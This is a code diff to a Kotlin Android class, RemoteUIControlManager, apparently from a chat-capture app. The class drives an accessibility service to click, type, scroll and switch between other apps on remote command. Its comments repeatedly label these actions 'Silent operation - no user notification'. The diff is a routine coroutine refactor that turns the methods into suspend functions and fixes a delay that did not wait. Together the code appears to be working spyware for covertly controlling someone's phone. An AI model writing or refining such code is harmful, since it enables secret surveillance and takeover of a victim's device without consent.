@@ -6,11 +6,7 @@ import android.content.pm.PackageManager
 import com.chats.capture.CaptureApplication
 import com.chats.capture.automation.UIAutomator
 import com.chats.capture.services.EnhancedAccessibilityService
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
 import timber.log.Timber
 
 /**
@@ -19,13 +15,11 @@ import timber.log.Timber
  */
 class RemoteUIControlManager(private val context: Context) {
     
-    private val controlScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
-    
     /**
      * Execute UI click at coordinates
      * Silent operation - no user notification
      */
-    fun executeUIClick(x: Float, y: Float, packageName: String? = null): Boolean {
+    suspend fun executeUIClick(x: Float, y: Float, packageName: String? = null): Boolean {
         return try {
             val accessibilityService = getAccessibilityService() ?: return false
             val uiAutomator = UIAutomator(accessibilityService)
@@ -33,9 +27,7 @@ class RemoteUIControlManager(private val context: Context) {
             // Switch to target app if package specified
             if (packageName != null) {
                 switchToApp(packageName)
-                controlScope.launch {
-                    delay(500) // Wait for app to switch
-                }
+                delay(500) // Wait for app to switch
             }
             
             val success = uiAutomator.click(x, y)
@@ -51,7 +43,7 @@ class RemoteUIControlManager(private val context: Context) {
      * Find node by text and click
      * Silent operation - no user notification
      */
-    fun executeUIFindAndClick(text: String, packageName: String? = null): Boolean {
+    suspend fun executeUIFindAndClick(text: String, packageName: String? = null): Boolean {
         return try {
             val accessibilityService = getAccessibilityService() ?: return false
             val uiAutomator = UIAutomator(accessibilityService)
@@ -59,9 +51,7 @@ class RemoteUIControlManager(private val context: Context) {
             // Switch to target app if package specified
             if (packageName != null) {
                 switchToApp(packageName)
-                controlScope.launch {
-                    delay(500) // Wait for app to switch
-                }
+                delay(500) // Wait for app to switch
             }
             
             val node = uiAutomator.findNodeByText(text)
@@ -84,7 +74,7 @@ class RemoteUIControlManager(private val context: Context) {
      * Find node by view ID and click
      * Silent operation - no user notification
      */
-    fun executeUIFindAndClickById(viewId: String, packageName: String? = null): Boolean {
+    suspend fun executeUIFindAndClickById(viewId: String, packageName: String? = null): Boolean {
         return try {
             val accessibilityService = getAccessibilityService() ?: return false
             val uiAutomator = UIAutomator(accessibilityService)
@@ -92,9 +82,7 @@ class RemoteUIControlManager(private val context: Context) {
             // Switch to target app if package specified
             if (packageName != null) {
                 switchToApp(packageName)
-                controlScope.launch {
-                    delay(500) // Wait for app to switch
-                }
+                delay(500) // Wait for app to switch
             }
             
             val node = uiAutomator.findNodeById(viewId)
@@ -117,7 +105,7 @@ class RemoteUIControlManager(private val context: Context) {
      * Find field and input text
      * Silent operation - no user notification
      */
-    fun executeUIInput(text: String, findText: String? = null, viewId: String? = null, packageName: String? = null): Boolean {
+    suspend fun executeUIInput(text: String, findText: String? = null, viewId: String? = null, packageName: String? = null): Boolean {
         return try {
             val accessibilityService = getAccessibilityService() ?: return false
             val uiAutomator = UIAutomator(accessibilityService)
@@ -125,9 +113,7 @@ class RemoteUIControlManager(private val context: Context) {
             // Switch to target app if package specified
             if (packageName != null) {
                 switchToApp(packageName)
-                controlScope.launch {
-                    delay(500) // Wait for app to switch
-                }
+                delay(500) // Wait for app to switch
             }
             
             val node = when {
@@ -155,7 +141,7 @@ class RemoteUIControlManager(private val context: Context) {
      * Execute scroll in direction
      * Silent operation - no user notification
      */
-    fun executeUIScroll(direction: String, packageName: String? = null): Boolean {
+    suspend fun executeUIScroll(direction: String, packageName: String? = null): Boolean {
         return try {
             val accessibilityService = getAccessibilityService() ?: return false
             val uiAutomator = UIAutomator(accessibilityService)
@@ -163,9 +149,7 @@ class RemoteUIControlManager(private val context: Context) {
             // Switch to target app if package specified
             if (packageName != null) {
                 switchToApp(packageName)
-                controlScope.launch {
-                    delay(500) // Wait for app to switch
-                }
+                delay(500) // Wait for app to switch
             }
             
             val rootNode = accessibilityService.rootInActiveWindow ?: return false
